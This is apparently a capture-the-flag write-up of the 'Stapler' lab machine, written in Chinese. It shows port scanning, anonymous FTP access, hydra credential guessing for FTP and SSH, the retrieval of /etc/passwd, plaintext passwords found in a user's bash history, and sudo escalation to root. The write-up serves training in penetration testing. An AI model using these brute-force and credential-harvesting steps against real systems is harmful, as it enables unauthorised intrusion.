###### tags: `Offsec` `PG Play` `Intermediate` `Linux`

# Stapler
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.163.148 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.163.148:21
Open 192.168.163.148:22
Open 192.168.163.148:53
Open 192.168.163.148:80
Open 192.168.163.148:139
Open 192.168.163.148:666
Open 192.168.163.148:3306
Open 192.168.163.148:12380

PORT      STATE SERVICE     REASON  VERSION
21/tcp    open  ftp         syn-ack vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.212
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp    open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open  tcpwrapped  syn-ack
80/tcp    open  http        syn-ack PHP cli server 5.5 or later
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 404 Not Found
139/tcp   open  netbios-ssn syn-ack Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open  tcpwrapped  syn-ack
3306/tcp  open  mysql       syn-ack MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 9
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn, SupportsTransactions, ODBCClient, Speaks41ProtocolOld, IgnoreSigpipes, InteractiveClient, SupportsCompression, ConnectWithDatabase, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, LongPassword, LongColumnFlag, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: /]7a-K\/c\x1D#}_3\x10\x08ms2\x06
|_  Auth Plugin Name: mysql_native_password
12380/tcp open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Tim, we need to-do better next year for Initech
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`Anonymous`登入`ftp`找到一個`note`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ftp 192.168.163.148

Name (192.168.163.148:kali): Anonymous
331 Please specify the password.
Password:

ftp> ls -al
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jun 04  2016 .
drwxr-xr-x    2 0        0            4096 Jun 04  2016 ..
-rw-r--r--    1 0        0             107 Jun 03  2016 note

ftp> get note

┌──(kali㉿kali)-[~/pgplay]
└─$ cat note
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

用`elly`帳號破`ftp`，得`elly/ylle`登入`ftp`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ hydra -l elly -e nsr 192.168.163.148 ftp

[21][ftp] host: 192.168.163.148   login: elly   password: ylle

┌──(kali㉿kali)-[~/pgplay]
└─$ ftp 192.168.163.148

Name (192.168.163.148:kali): elly
331 Please specify the password.
Password: ylle

ftp> ls
drwxr-xr-x    5 0        0            4096 Jun 03  2016 X11
drwxr-xr-x    3 0        0            4096 Jun 03  2016 acpi
-rw-r--r--    1 0        0            3028 Apr 20  2016 adduser.conf
-rw-r--r--    1 0        0              51 Jun 03  2016 aliases
-rw-r--r--    1 0        0           12288 Jun 03  2016 aliases.db
drwxr-xr-x    2 0        0            4096 Jun 07  2016 alternatives
drwxr-xr-x    8 0        0            4096 Jun 03  2016 apache2
drwxr-xr-x    3 0        0            4096 Jun 03  2016 apparmor
drwxr-xr-x    9 0        0            4096 Jun 06  2016 apparmor.d
drwxr-xr-x    3 0        0            4096 Jun 03  2016 apport
drwxr-xr-x    6 0        0            4096 Jun 03  2016 apt
-rw-r-----    1 0        1             144 Jan 14  2016 at.deny
drwxr-xr-x    5 0        0            4096 Jun 03  2016 authbind
-rw-r--r--    1 0        0            2188 Sep 01  2015 bash.bashrc
drwxr-xr-x    2 0        0            4096 Jun 03  2016 bash_completion.d
-rw-r--r--    1 0        0             367 Jan 27  2016 bindresvport.blacklist
drwxr-xr-x    2 0        0            4096 Apr 12  2016 binfmt.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 byobu
drwxr-xr-x    3 0        0            4096 Jun 03  2016 ca-certificates
-rw-r--r--    1 0        0            7788 Jun 03  2016 ca-certificates.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 console-setup
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.daily
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.hourly
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.monthly
drwxr-xr-x    2 0        0            4096 Jun 03  2016 cron.weekly
-rw-r--r--    1 0        0             722 Apr 05  2016 crontab
-rw-r--r--    1 0        0              54 Jun 03  2016 crypttab
drwxr-xr-x    2 0        0            4096 Jun 04  2016 dbconfig-common
drwxr-xr-x    4 0        0            4096 Jun 03  2016 dbus-1
-rw-r--r--    1 0        0            2969 Nov 10  2015 debconf.conf
-rw-r--r--    1 0        0              12 Apr 30  2015 debian_version
drwxr-xr-x    3 0        0            4096 Jun 02  2021 default
-rw-r--r--    1 0        0             604 Jul 02  2015 deluser.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 depmod.d
drwxr-xr-x    4 0        0            4096 Jun 03  2016 dhcp
-rw-r--r--    1 0        0           26716 Jul 30  2015 dnsmasq.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 dnsmasq.d
drwxr-xr-x    4 0        0            4096 Jun 07  2016 dpkg
-rw-r--r--    1 0        0              96 Apr 20  2016 environment
drwxr-xr-x    4 0        0            4096 Jun 03  2016 fonts
-rw-r--r--    1 0        0             594 Jun 03  2016 fstab
-rw-r--r--    1 0        0             132 Feb 11  2016 ftpusers
-rw-r--r--    1 0        0             280 Jun 20  2014 fuse.conf
-rw-r--r--    1 0        0            2584 Feb 18  2016 gai.conf
-rw-rw-r--    1 0        0            1253 Jun 04  2016 group
-rw-------    1 0        0            1240 Jun 03  2016 group-
drwxr-xr-x    2 0        0            4096 Jun 03  2016 grub.d
-rw-r-----    1 0        42           1004 Jun 04  2016 gshadow
-rw-------    1 0        0             995 Jun 03  2016 gshadow-
drwxr-xr-x    3 0        0            4096 Jun 03  2016 gss
-rw-r--r--    1 0        0              92 Oct 22  2015 host.conf
-rw-r--r--    1 0        0              12 Jun 03  2016 hostname
-rw-r--r--    1 0        0             469 Jun 05  2016 hosts
-rw-r--r--    1 0        0             411 Jun 03  2016 hosts.allow
-rw-r--r--    1 0        0             711 Jun 03  2016 hosts.deny
-rw-r--r--    1 0        0            1257 Jun 03  2016 inetd.conf
drwxr-xr-x    2 0        0            4096 Feb 06  2016 inetd.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 init
drwxr-xr-x    2 0        0            4096 May 05  2021 init.d
drwxr-xr-x    5 0        0            4096 Jun 03  2016 initramfs-tools
-rw-r--r--    1 0        0            1748 Feb 04  2016 inputrc
drwxr-xr-x    3 0        0            4096 Jun 03  2016 insserv
-rw-r--r--    1 0        0             771 Mar 06  2015 insserv.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 insserv.conf.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 iproute2
drwxr-xr-x    2 0        0            4096 Jun 03  2016 iptables
drwxr-xr-x    2 0        0            4096 Jun 03  2016 iscsi
-rw-r--r--    1 0        0             345 May 22 04:57 issue
-rw-r--r--    1 0        0             197 Jun 03  2016 issue.net
drwxr-xr-x    2 0        0            4096 Jun 03  2016 kbd
drwxr-xr-x    5 0        0            4096 Jun 03  2016 kernel
-rw-r--r--    1 0        0             144 Jun 03  2016 kernel-img.conf
-rw-r--r--    1 0        0           27105 May 05  2021 ld.so.cache
-rw-r--r--    1 0        0              34 Jan 27  2016 ld.so.conf
drwxr-xr-x    2 0        0            4096 Jun 07  2016 ld.so.conf.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 ldap
-rw-r--r--    1 0        0             267 Oct 22  2015 legal
-rw-r--r--    1 0        0             191 Jan 19  2016 libaudit.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 libnl-3
drwxr-xr-x    4 0        0            4096 Jun 06  2016 lighttpd
-rw-r--r--    1 0        0            2995 Apr 14  2016 locale.alias
-rw-r--r--    1 0        0            9149 Jun 03  2016 locale.gen
-rw-r--r--    1 0        0            3687 Jun 03  2016 localtime
drwxr-xr-x    6 0        0            4096 Jun 03  2016 logcheck
-rw-r--r--    1 0        0           10551 Mar 29  2016 login.defs
-rw-r--r--    1 0        0             703 May 06  2015 logrotate.conf
drwxr-xr-x    2 0        0            4096 Jun 04  2016 logrotate.d
-rw-r--r--    1 0        0             103 Apr 12  2016 lsb-release
drwxr-xr-x    2 0        0            4096 Jun 03  2016 lvm
-r--r--r--    1 0        0              33 Jun 03  2016 machine-id
-rw-r--r--    1 0        0             111 Nov 20  2015 magic
-rw-r--r--    1 0        0             111 Nov 20  2015 magic.mime
-rw-r--r--    1 0        0            2579 Jun 04  2016 mailcap
-rw-r--r--    1 0        0             449 Oct 30  2015 mailcap.order
drwxr-xr-x    2 0        0            4096 Jun 03  2016 mdadm
-rw-r--r--    1 0        0           24241 Oct 30  2015 mime.types
-rw-r--r--    1 0        0             967 Oct 30  2015 mke2fs.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 modprobe.d
-rw-r--r--    1 0        0             195 Apr 20  2016 modules
drwxr-xr-x    2 0        0            4096 Jun 03  2016 modules-load.d
lrwxrwxrwx    1 0        0              19 Jun 03  2016 mtab -> ../proc/self/mounts
drwxr-xr-x    4 0        0            4096 Jun 06  2016 mysql
drwxr-xr-x    7 0        0            4096 May 22 04:57 network
-rw-r--r--    1 0        0              91 Oct 22  2015 networks
drwxr-xr-x    2 0        0            4096 Jun 03  2016 newt
-rw-r--r--    1 0        0             497 May 04  2014 nsswitch.conf
drwxr-xr-x    2 0        0            4096 Apr 20  2016 opt
lrwxrwxrwx    1 0        0              21 Jun 03  2016 os-release -> ../usr/lib/os-release
-rw-r--r--    1 0        0            6595 Jun 23  2015 overlayroot.conf
-rw-r--r--    1 0        0             552 Mar 16  2016 pam.conf
drwxr-xr-x    2 0        0            4096 May 05  2021 pam.d
-rw-r--r--    1 0        0            2908 Jun 04  2016 passwd
-rw-------    1 0        0            2869 Jun 03  2016 passwd-
drwxr-xr-x    4 0        0            4096 Jun 03  2016 perl
drwxr-xr-x    3 0        0            4096 Jun 03  2016 php
drwxr-xr-x    3 0        0            4096 Jun 06  2016 phpmyadmin
drwxr-xr-x    3 0        0            4096 Jun 03  2016 pm
drwxr-xr-x    5 0        0            4096 Jun 03  2016 polkit-1
drwxr-xr-x    3 0        0            4096 Jun 03  2016 postfix
drwxr-xr-x    4 0        0            4096 Jun 03  2016 ppp
-rw-r--r--    1 0        0             575 Oct 22  2015 profile
drwxr-xr-x    2 0        0            4096 Jun 03  2016 profile.d
-rw-r--r--    1 0        0            2932 Oct 25  2014 protocols
drwxr-xr-x    2 0        0            4096 Jun 03  2016 python
drwxr-xr-x    2 0        0            4096 Jun 03  2016 python2.7
drwxr-xr-x    2 0        0            4096 Jun 03  2016 python3
drwxr-xr-x    2 0        0            4096 Jun 03  2016 python3.5
-rwxr-xr-x    1 0        0             472 Jun 06  2016 rc.local
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc0.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc1.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc2.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc3.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc4.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc5.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rc6.d
drwxr-xr-x    2 0        0            4096 Jun 06  2016 rcS.d
-rw-r--r--    1 0        0              27 May 22 04:57 resolv.conf
drwxr-xr-x    5 0        0            4096 Jun 06  2016 resolvconf
-rwxr-xr-x    1 0        0             268 Nov 10  2015 rmt
-rw-r--r--    1 0        0             887 Oct 25  2014 rpc
-rw-r--r--    1 0        0            1371 Jan 27  2016 rsyslog.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 rsyslog.d
drwxr-xr-x    3 0        0            4096 May 22 06:40 samba
-rw-r--r--    1 0        0            3663 Jun 09  2015 screenrc
-rw-r--r--    1 0        0            4038 Mar 29  2016 securetty
drwxr-xr-x    4 0        0            4096 Jun 03  2016 security
drwxr-xr-x    2 0        0            4096 Jun 03  2016 selinux
-rw-r--r--    1 0        0           19605 Oct 25  2014 services
drwxr-xr-x    2 0        0            4096 Jun 03  2016 sgml
-rw-r-----    1 0        42           4518 Jun 01  2021 shadow
-rw-------    1 0        0            1873 Jun 03  2016 shadow-
-rw-r--r--    1 0        0             125 Jun 03  2016 shells
drwxr-xr-x    2 0        0            4096 Jun 03  2016 skel
-rw-r--r--    1 0        0             100 Nov 25  2015 sos.conf
drwxr-xr-x    2 0        0            4096 Jun 04  2016 ssh
drwxr-xr-x    4 0        0            4096 Jun 03  2016 ssl
-rw-r--r--    1 0        0             644 Jun 04  2016 subgid
-rw-------    1 0        0             625 Jun 03  2016 subgid-
-rw-r--r--    1 0        0             644 Jun 04  2016 subuid
-rw-------    1 0        0             625 Jun 03  2016 subuid-
-r--r-----    1 0        0             769 Jun 05  2016 sudoers
drwxr-xr-x    2 0        0            4096 Jun 03  2016 sudoers.d
-rw-r--r--    1 0        0            2227 Jun 03  2016 sysctl.conf
drwxr-xr-x    2 0        0            4096 Jun 03  2016 sysctl.d
drwxr-xr-x    5 0        0            4096 Jun 03  2016 systemd
drwxr-xr-x    2 0        0            4096 Jun 03  2016 terminfo
-rw-r--r--    1 0        0              14 Jun 03  2016 timezone
drwxr-xr-x    2 0        0            4096 Apr 12  2016 tmpfiles.d
-rw-r--r--    1 0        0            1260 Mar 16  2016 ucf.conf
drwxr-xr-x    4 0        0            4096 Jun 03  2016 udev
drwxr-xr-x    3 0        0            4096 Jun 03  2016 ufw
drwxr-xr-x    2 0        0            4096 Jun 03  2016 update-motd.d
drwxr-xr-x    2 0        0            4096 Jun 03  2016 update-notifier
drwxr-xr-x    2 0        0            4096 Jun 03  2016 vim
drwxr-xr-x    4 0        0            4096 May 05  2021 vmware-tools
-rw-r--r--    1 0        0             278 Jun 03  2016 vsftpd.banner
-rw-r--r--    1 0        0               0 Jun 03  2016 vsftpd.chroot_list
-rw-r--r--    1 0        0            5961 Jun 04  2016 vsftpd.conf
-rw-r--r--    1 0        0               0 Jun 03  2016 vsftpd.user_list
lrwxrwxrwx    1 0        0              23 Jun 03  2016 vtrgb -> /etc/alternatives/vtrgb
-rw-r--r--    1 0        0            4942 Jan 08  2016 wgetrc
drwxr-xr-x    3 0        0            4096 Jun 03  2016 xdg
drwxr-xr-x    2 0        0            4096 Jun 03  2016 xml
drwxr-xr-x    2 0        0            4096 Jun 03  2016 zsh
```

看起來在`/etc`資料夾，下載`passwd`
```
ftp> get passwd

┌──(kali㉿kali)-[~/pgplay]
└─$ cat passwd      
root:x:0:0:root:/root:/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
messagebus:x:108:111::/var/run/dbus:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
peter:x:1000:1000:Peter,,,:/home/peter:/bin/zsh
mysql:x:111:117:MySQL Server,,,:/nonexistent:/bin/false
RNunemaker:x:1001:1001::/home/RNunemaker:/bin/bash
ETollefson:x:1002:1002::/home/ETollefson:/bin/bash
DSwanger:x:1003:1003::/home/DSwanger:/bin/bash
AParnell:x:1004:1004::/home/AParnell:/bin/bash
SHayslett:x:1005:1005::/home/SHayslett:/bin/bash
MBassin:x:1006:1006::/home/MBassin:/bin/bash
JBare:x:1007:1007::/home/JBare:/bin/bash
LSolum:x:1008:1008::/home/LSolum:/bin/bash
IChadwick:x:1009:1009::/home/IChadwick:/bin/false
MFrei:x:1010:1010::/home/MFrei:/bin/bash
SStroud:x:1011:1011::/home/SStroud:/bin/bash
CCeaser:x:1012:1012::/home/CCeaser:/bin/dash
JKanode:x:1013:1013::/home/JKanode:/bin/bash
CJoo:x:1014:1014::/home/CJoo:/bin/bash
Eeth:x:1015:1015::/home/Eeth:/usr/sbin/nologin
LSolum2:x:1016:1016::/home/LSolum2:/usr/sbin/nologin
JLipps:x:1017:1017::/home/JLipps:/bin/sh
jamie:x:1018:1018::/home/jamie:/bin/sh
Sam:x:1019:1019::/home/Sam:/bin/zsh
Drew:x:1020:1020::/home/Drew:/bin/bash
jess:x:1021:1021::/home/jess:/bin/bash
SHAY:x:1022:1022::/home/SHAY:/bin/bash
Taylor:x:1023:1023::/home/Taylor:/bin/sh
mel:x:1024:1024::/home/mel:/bin/bash
kai:x:1025:1025::/home/kai:/bin/sh
zoe:x:1026:1026::/home/zoe:/bin/bash
NATHAN:x:1027:1027::/home/NATHAN:/bin/bash
www:x:1028:1028::/home/www:
postfix:x:112:118::/var/spool/postfix:/bin/false
ftp:x:110:116:ftp daemon,,,:/var/ftp:/bin/false
elly:x:1029:1029::/home/elly:/bin/bash
```

把它做成一個`users.txt`可以用來爆破ssh
```
┌──(kali㉿kali)-[~/pgplay]
└─$ cat users.txt
root:root
www-data:www-data
RNunemaker:RNunemaker
ETollefson:ETollefson
DSwanger:DSwanger
AParnell:AParnell
SHayslett:SHayslett
MBassin:MBassin
JBare:JBare
LSolum:LSolum
IChadwick:IChadwick
MFrei:MFrei
SStroud:SStroud
CCeaser:CCeaser
JKanode:JKanode
CJoo:CJoo
Eeth:Eeth
LSolum2:LSolum2
JLipps:JLipps
jamie:jamie
Sam:Sam
Drew:Drew
jess:jess
SHAY:SHAY
Taylor:Taylor
mel:mel
kai:kai
zoe:zoe
NATHAN:NATHAN
elly:elly
```

`hydra`，破出`SHayslett/SHayslett`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ hydra -t 4 -C /home/kali/pgplay/users.txt 192.168.163.148 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-22 01:55:31
[DATA] max 4 tasks per 1 server, overall 4 tasks, 29 login tries, ~8 tries per task
[DATA] attacking ssh://192.168.163.148:22/
[22][ssh] host: 192.168.163.148   login: SHayslett   password: SHayslett
```

ssh登入，在`/home`得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ssh SHayslett@192.168.163.148

SHayslett@192.168.163.148's password: SHayslett

SHayslett@red:/home$ cat local.txt
2bceb8ed273ff82b566ffd1b74fa6ce8
```

`linpeas.sh`
```
SHayslett@red:/tmp$ wget 192.168.45.212/linpeas.sh
SHayslett@red:/tmp$ chmod +x linpeas.sh
SHayslett@red:/tmp$ ./linpeas.sh

╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                      
/home/MFrei/.bash_history
/home/Sam/.bash_history
/home/CCeaser/.bash_history
/home/DSwanger/.bash_history
/home/JBare/.bash_history
/home/mel/.bash_history
/home/jess/.bash_history
/home/MBassin/.bash_history
/home/kai/.bash_history
/home/elly/.bash_history
/home/Drew/.bash_history
/home/JLipps/.bash_history
/home/jamie/.bash_history
/home/Taylor/.bash_history
/home/SHayslett/.bash_history
/home/AParnell/.bash_history
/home/CJoo/.bash_history
/home/Eeth/.bash_history
/home/RNunemaker/.bash_history
/home/SHAY/.bash_history
/home/ETollefson/.bash_history
/home/IChadwick/.bash_history
/home/LSolum2/.bash_history
/home/SStroud/.bash_history
/home/LSolum/.bash_history
/home/NATHAN/.bash_history
/home/zoe/.bash_history
/root/
/var/www
```

我一個一個進去看看到`peter`的密碼`JZQuyIN5`跟`JKanode`的密碼`thisimypassword`
```
SHayslett@red:/home$ cat /home/JKanode/.bash_history
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 ssh peter@localhost
ps -ef
top
kill -9 3747
exit
```

登入`peter`的帳號
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ssh peter@192.168.163.148

peter@192.168.163.148's password: JZQuyIN5

red% sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
```

切root，在/root得proof.txt
```
➜  peter cd /root
➜  ~ ls
fix-wordpress.sh  flag.txt  issue  proof.txt  wordpress.sql
➜  ~ cat proof.txt
c81aeed035c830b8b02aa82bedf97e19
```